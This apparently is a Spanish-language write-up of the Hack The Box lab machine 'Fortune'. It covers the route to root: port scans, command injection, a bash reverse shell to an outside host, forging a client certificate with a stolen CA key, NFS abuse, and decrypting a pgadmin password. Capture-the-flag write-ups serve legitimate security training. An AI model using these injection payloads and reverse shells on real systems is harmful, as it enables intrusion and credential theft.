---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Fortune            |
| Os                     | Custom             |
| Difficulty             | Insane             |
| Points                 | 0                  |
| IP                     | 10.10.10.127       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Fortune/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.127
```

![nmap 1](/assets/images/Fortune/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.127 -oG allPorts
```

![nmap2](/assets/images/Fortune/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,80,443 10.10.10.127 -oN targeted
```

![nmap 3.1](/assets/images/Fortune/nmap3.png)

Como vemos en este ultimo escaneo, encontramos un certificado SSL que contiene un dominio. Procederemos a agregarlo a nuestro etc/hosts.

Usaremos ahora whatweb para ver mas sobre la pagina que estamos viendo

```s
sudo nmap -sCV -p22,80,443 10.10.10.127 -oN targeted
```

![openssl](/assets/images/Fortune/)

Vemos que el certificado SSL esta corrupto, no se a que se deba esto pero procederemos a recolectar mas informacion.

Para mas informacion sobre el certificado, podemos hacer lo siguiente:

```s
openssl s_client 10.10.10.127:443
```

Vemos que hay potenciales correos quizas de administracion del sistema

![openssl](/assets/images/Fortune/openssl.png)

Ahora usaremos burpsuite. Interceptamos la peticion al pedir la fortuna ahora para intentar hacer una inyeccion de sql y lo mandamos al repeter. Como no se pudo, ahora queda mandarlo al intruder con CTRL+i, con un ataque de tipo sniper y vemos que ya esta seleccionado el payload; en la parte de payloads cargamos la wordlist /usr/share/seclists/Fuzzing/special-chars.txt, le quitamos el encode de url y en la parte de Options, extract le asignamos que nos muestre el content lenght tambien y comenzamos el ataque.

![Burp](/assets/images/Fortune/burp.png)

Con WFUZZ tambien se puede hacer de la siguiente manera:

```s
wfuzz -c --hl=16 -w /usr/share/seclists/Fuzzing/special-chars.txt -d 'db=FUZZ' http://10.10.10.127/select
```

![wfuzz](/assets/images/Fortune/wfuzz.png)

Encontramos que hay caracteres que aparecen en la respuesta, lo cual puede significar que en el backend se esta procesando algun comando de bash.

Asi que ahora lo que podemos intentar en la inyeccion con el burpsuite es:

```s
; id
; cat /etc/passwd | grep sh$
```

![burp2](/assets/images/Fortune/burp2.png)

![burp3](/assets/images/Fortune/burp3.png)

Ahora intentaremos hacer una reverse shell con:

```s
bash -c 'bash -i >& /dev/tcp/10.10.14.29/4444 0>&1'
```

Ahora para poder insertar comandos comodamente desde nuestro cmd con bash haremos lo siguiente:

```s
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

#CTRL+c
trap ctrl_c INT

while true; do
    echo -n "[~]>" && read -r command
    echo; curl -s POST "http://10.10.10.127/select" -d "db=; echo rebick; $command" | awk '/rebick/,/<\/pre>/' | grep -vE "rebick|</pre>" | sed "s/&#39;/'/g" | sed 's/&#34;/"/g'
done
```

Ahora para poder desplazarnos bien, lo ejecutamos como:

```s
sudo rlwrap ./command.sh
```

Lo siguiente sera generarnos un certificado SSL, navegando por los directorios encontraremos un archivo de certificado y los tomaremos de la siguiente manera:

* Nos copiamos los siguientes archivos

```s
#mkdir certs
#nano intermediate.cert
cat /home/bob/ca/intermediate/certs/intermediate.cert.pem
#nano intermediate.key
cat /home/bob/ca/intermediate/private/intermediate.key.pem
```

* Ahora para generar nuestro .pfx

```s
openssl genrsa -out rebick.key 2048
openssl req -new -key rebick.key -out rebick.csr
openssl x509 -req -in rebick.csr -CA intermediate.cert -CAkey intermediate.key -CAcreateserial -out rebick.pem -days 365 -sha256
openssl pkcs12 -export -out rebick.pfx -inkey rebick.key -in rebick.pem -certfile intermediate.cert
```

Ahora podremos meter nuestro certificado en nuestro navegador para poder usar el certificado y la vista es la siguiente:

![ssl](/assets/images/Fortune/ssl.png)


Ahora en el enlace que esta en la pagina, podemos ver una llave privada de rsa, la cual copiaremos y la usaremos para autenticarnos como el usuario nfsuser, ahora lo que esta pasando en la maquina es que la regla de ssh abre otros puertos. Podemos hacer con bash un reconocimiento de puertos con bash de la manera siguiente:

```s
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo...\n"
    tput cnorm; exit 1
}
trap ctrl_c INT

tput civis

for port in $(seq 1 65535); do
    timeout 1 bash -c "echo '' > /dev/tcp/10.10.10.127/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait

tput cnorm
```

![Port Scanning](/assets/images/Fortune/port_scan.png)

Ahora podemos testear el puerto 2049 de la manera siguiente:

```s
showmount -e 10.10.10.127
#Nos creamos nuestra carpeta
mkdir /mnt/montura
mount -t nfs 10.10.10.127:home /mnt/montura/
```

Ahora podemos navegar a /mnt/montura/ y ver los archivos de Charlie, debido a que el id de usuario coincide con el nuestro, entoces si creamos un usuario con el mismo id que el nuestro, modificando el /etc/passwd.
Tambien vemos que ahora tenemos acceso al archivo .ssh, bastara ahora solo con poner nuestra llave pubica para poder acceder como charlie

![Charlie](/assets/images/Fortune/charlie.png)

Ahora que estamos dentro, y sabemos que hay algo en el pgadmin podemos intentar filtrar la busqueda de la siguiente forma:

```s
find / -group wheel 2>/dev/null | grep -vE "/usr/local|/usr|/dev" | less -S
```

Ahora con sql abrimos el archivo

```sql
sqlite3 /var/appsrv/pgadmin4/pgadmin4.db
.tables
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
```

Una vez tenemos la llave y el hash del usuario, encontraremos un archivo en /usr/local/pgadmin4/pgadmin4-3.4/web/./pgadmin/utils/crypto.py, nos lo copiaremos para desencritar la contrasena de la manera siguiente:

![Crypto](/assets/images/Fortune/crypto.png)

Ahora tenemos la contrasena y podemos usarla para convertirnos en root.

![Root](/assets/images/Fortune/root.png)

![Powned](/assets/images/Fortune/pwned.png)